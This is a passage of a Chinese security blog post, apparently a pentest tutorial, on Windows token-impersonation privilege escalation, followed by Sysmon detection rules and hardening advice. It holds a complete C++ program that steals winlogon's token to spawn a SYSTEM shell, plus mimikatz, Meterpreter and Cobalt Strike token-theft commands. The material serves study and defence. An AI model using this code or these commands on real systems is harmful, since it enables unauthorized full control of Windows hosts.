+<h3 id="6-2-C-完整实现"><a href="#6-2-C-完整实现" class="headerlink" title="6.2 C++ 完整实现"></a>6.2 C++ 完整实现</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;advapi32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetPID</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* name)</span> </span>&#123;</span><br><span class="line">    HANDLE snap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32W pe = &#123; <span class="built_in">sizeof</span>(pe) &#125;; <span class="type">int</span> pid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32FirstW</span>(snap, &amp;pe)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123; <span class="keyword">if</span> (!_wcsicmp(pe.szExeFile, name)) &#123; pid = pe.th32ProcessID; <span class="keyword">break</span>; &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32NextW</span>(snap, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(snap); <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EnablePriv</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* priv)</span> </span>&#123;</span><br><span class="line">    HANDLE hToken; TOKEN_PRIVILEGES tp; LUID luid;</span><br><span class="line">    <span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &amp;hToken);</span><br><span class="line">    <span class="built_in">LookupPrivilegeValueW</span>(<span class="literal">NULL</span>, priv, &amp;luid);</span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>; tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    BOOL r = <span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hToken); <span class="keyword">return</span> r &amp;&amp; <span class="built_in">GetLastError</span>() == ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">EnablePriv</span>(<span class="string">L&quot;SeDebugPrivilege&quot;</span>)) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="type">int</span> pid = <span class="built_in">GetPID</span>(<span class="string">L&quot;winlogon.exe&quot;</span>);</span><br><span class="line">    HANDLE hProc = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, pid);</span><br><span class="line">    HANDLE hToken, hDup;</span><br><span class="line">    <span class="built_in">OpenProcessToken</span>(hProc, TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY, &amp;hToken);</span><br><span class="line">    <span class="built_in">DuplicateTokenEx</span>(hToken, TOKEN_ALL_ACCESS, <span class="literal">NULL</span>, SecurityImpersonation, TokenPrimary, &amp;hDup);</span><br><span class="line">    STARTUPINFOW si = &#123; <span class="built_in">sizeof</span>(si) &#125;; PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="built_in">CreateProcessWithTokenW</span>(hDup, <span class="number">0</span>, <span class="string">L&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] SYSTEM Shell PID: %d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDup); <span class="built_in">CloseHandle</span>(hToken); <span class="built_in">CloseHandle</span>(hProc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-mimikatz-Incognito-操作"><a href="#6-3-mimikatz-Incognito-操作" class="headerlink" title="6.3 mimikatz &#x2F; Incognito 操作"></a>6.3 mimikatz &#x2F; Incognito 操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mimikatz</span></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># token::elevate /system</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Meterpreter / Cobalt Strike</span></span><br><span class="line">meterpreter &gt; load incognito</span><br><span class="line">meterpreter &gt; impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br><span class="line">beacon&gt; steal_token &lt;PID&gt;</span><br><span class="line">beacon&gt; rev2self</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、Meterpreter-getsystem-内部机制"><a href="#七、Meterpreter-getsystem-内部机制" class="headerlink" title="七、Meterpreter getsystem 内部机制"></a>七、Meterpreter getsystem 内部机制</h2><h3 id="7-1-三种技术"><a href="#7-1-三种技术" class="headerlink" title="7.1 三种技术"></a>7.1 三种技术</h3><table>
+<thead>
+<tr>
+<th>技术</th>
+<th>原理</th>
+<th>前置条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Technique 0</strong></td>
+<td>命名管道模拟 + SCM 触发</td>
+<td><code>SeImpersonatePrivilege</code></td>
+</tr>
+<tr>
+<td><strong>Technique 1</strong></td>
+<td>OpenProcessToken + DuplicateTokenEx</td>
+<td><code>SeDebugPrivilege</code></td>
+</tr>
+<tr>
+<td><strong>Technique 2</strong></td>
+<td>计划任务 Token Duplication</td>
+<td>管理员权限</td>
+</tr>
+</tbody></table>
+<h3 id="7-2-内部流程"><a href="#7-2-内部流程" class="headerlink" title="7.2 内部流程"></a>7.2 内部流程</h3><p><strong>Technique 0（命名管道模拟）：</strong></p>
+<pre class="mermaid">flowchart LR
+    A[检查 SeImpersonatePrivilege] --> B[创建命名管道]
+    B --> C[SCM 触发 services.exe 连接]
+    C --> D[ImpersonateNamedPipeClient]
+    D --> E[DuplicateTokenEx → Primary Token]
+    E --> F[CreateProcessAsUser → SYSTEM]</pre>
+
+<p><strong>Technique 1（令牌复制）：</strong> ① 启用 SeDebugPrivilege → ② OpenProcess(winlogon.exe) → ③ OpenProcessToken → ④ DuplicateTokenEx → ⑤ CreateProcessWithTokenW → SYSTEM Shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem -t 1    <span class="comment"># 令牌复制</span></span><br><span class="line">meterpreter &gt; getsystem -t 0    <span class="comment"># 命名管道</span></span><br><span class="line">meterpreter &gt; getsystem         <span class="comment"># 自动尝试所有</span></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="八、防御与检测"><a href="#八、防御与检测" class="headerlink" title="八、防御与检测"></a>八、防御与检测</h2><h3 id="8-1-关键检测指标"><a href="#8-1-关键检测指标" class="headerlink" title="8.1 关键检测指标"></a>8.1 关键检测指标</h3><table>
+<thead>
+<tr>
+<th>检测维度</th>
+<th>特征</th>
+<th>日志来源</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>进程创建</td>
+<td>cmd.exe 父进程为非标准 SYSTEM 进程</td>
+<td>Sysmon Event 1</td>
+</tr>
+<tr>
+<td>特权启用</td>
+<td>非服务进程启用 SeImpersonatePrivilege</td>
+<td>Sysmon Event 8</td>
+</tr>
+<tr>
+<td>命名管道</td>
+<td>异常格式的命名管道</td>
+<td>Sysmon Event 17,18</td>
+</tr>
+<tr>
+<td>令牌操作</td>
+<td>DuplicateTokenEx &#x2F; ImpersonateLoggedOnUser</td>
+<td>EDR Hook</td>
+</tr>
+<tr>
+<td>特殊登录</td>
+<td>4672 中敏感特权分配</td>
+<td>Security Event 4672</td>
+</tr>
+<tr>
+<td>NTLM 回环</td>
+<td>源 IP &#x3D; 127.0.0.1</td>
+<td>Network Monitor</td>
+</tr>
+</tbody></table>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Sysmon: 检测异常进程的敏感特权访问 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Sysmon</span> <span class="attr">schemaversion</span>=<span class="string">&quot;4.22&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProcessAccess</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">GrantedAccess</span>&gt;</span>0x1FFFFF<span class="tag">&lt;/<span class="name">GrantedAccess</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">SourceImage</span> <span class="attr">condition</span>=<span class="string">&quot;image&quot;</span>&gt;</span>cmd.exe<span class="tag">&lt;/<span class="name">SourceImage</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">SourceImage</span> <span class="attr">condition</span>=<span class="string">&quot;image&quot;</span>&gt;</span>powershell.exe<span class="tag">&lt;/<span class="name">SourceImage</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ProcessAccess</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Sysmon</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-加固措施"><a href="#8-2-加固措施" class="headerlink" title="8.2 加固措施"></a>8.2 加固措施</h3><ol>
+<li><strong>审计并移除非必要服务账户的 <code>SeImpersonatePrivilege</code></strong>：IIS &#x2F; MSSQL 等服务使用虚拟账户或 gMSA</li>
+<li><strong>服务账户最小权限原则</strong>：组策略审计特权分配</li>
+<li><strong>启用 Credential Guard</strong>：隔离 LSASS，阻止令牌窃取</li>
+<li><strong>启用 WDAC &#x2F; AppLocker</strong>：限制可执行文件来源</li>
+<li><strong>主机防火墙</strong>：限制异常本地回环 RPC 通信</li>
+</ol>
+<h3 id="8-3-关键事件-ID"><a href="#8-3-关键事件-ID" class="headerlink" title="8.3 关键事件 ID"></a>8.3 关键事件 ID</h3><table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>4672</td>
+<td>为新登录分配特殊特权</td>
+</tr>
+<tr>
+<td>4688</td>
+<td>进程创建（关注异常父 PID）</td>
+</tr>
+<tr>
+<td>4698</td>
+<td>计划任务创建</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><table>
+<thead>
+<tr>
+<th>特权</th>
+<th>利用方式</th>
+<th>代表工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SeImpersonatePrivilege</code></td>
+<td>命名管道 + NTLM 反射 &#x2F; COM 劫持</td>
+<td>PrintSpoofer, EfsPotato, GodPotato</td>
+</tr>
+<tr>
+<td><code>SeAssignPrimaryTokenPrivilege</code></td>
+<td>令牌复制 + CreateProcessAsUser</td>
+<td>自定义代码, PPID Spoofing</td>
+</tr>
+<tr>
+<td><code>SeDebugPrivilege</code></td>
+<td>读取 SYSTEM 进程 → 复制令牌</td>
+<td>mimikatz, getsystem -t 1</td>
+</tr>
+<tr>
+<td>无敏感特权</td>
+<td>UAC 绕过 &#x2F; 内核提权</td>
+<td>fodhelper, CVE-20XX</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>核心认知</strong>：令牌模拟利用的是 Windows 正常安全机制而非漏洞。防御重点在于<strong>减少特权分配</strong>和<strong>加强监控</strong>，而非等待补丁。</p>
+</blockquote>
+<hr>
+<h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">JuicyPotato</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> · <a target="_blank" rel="noopener" href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">原理分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/bugch3ck/SharpEfsPotato">EfsPotato</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">GodPotato</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/CCob/SweetPotato">SweetPotato</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/0xbadjuju/Tokenvator">Tokenvator</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">MS Docs: Access Tokens</a></li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>免责声明</strong>：本文所述技术仅供安全研究、授权渗透测试及防御建设使用。未经授权对计算机系统进行攻击或测试属于违法行为。作者对因滥用本文内容而导致的任何后果概不负责。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"># 权限提升</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/VulnHub-DC7-DC8-Pentest-Report/" rel="prev" title="VulnHub DC7 &amp; DC8 靶机笔记 — Drupal 漏洞链实战">
+                  <i class="fa fa-angle-left"></i> VulnHub DC7 & DC8 靶机笔记 — Drupal 漏洞链实战
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/SQL-injection-out-of-band/" rel="next" title="SQL注入：OOB外带注入">
+                  SQL注入：OOB外带注入 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
